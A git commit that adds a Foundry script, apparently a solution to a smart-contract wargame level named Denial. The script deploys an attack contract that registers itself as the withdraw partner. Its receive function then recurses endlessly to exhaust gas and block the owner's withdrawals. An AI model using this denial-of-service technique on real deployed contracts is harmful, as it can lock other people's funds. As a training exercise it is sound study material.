e8bb7ddfa1f1aa7c978ecd27c340c585c5bbecc1
mooji <70057651+moooooji@users.noreply.github.com>
2025-08-17 23:21:50 +0900

    level 20

---
+++ script/Denial.s.sol
@@ -0,0 +1,42 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import "../src/Denial.sol";
+
+contract DenialpScript is Script {
+
+    function setUp() public {
+    }
+
+    function run() public {
+        vm.startBroadcast();
+
+        Attack a = new Attack();
+        a.a();
+
+        vm.stopBroadcast();
+    }
+}
+
+contract Attack {
+    Denial target;
+    
+    function a() public {
+        target = Denial(payable(0x74406305802De4e224A33D86a65aeF121C8B2F7A));
+        target.setWithdrawPartner(address(this));
+    }
+
+    function b() public {
+        c();
+    }
+
+    function c() public {
+        b();
+    }
+
+    receive() external payable {
+        b();
+    }
+    
+}
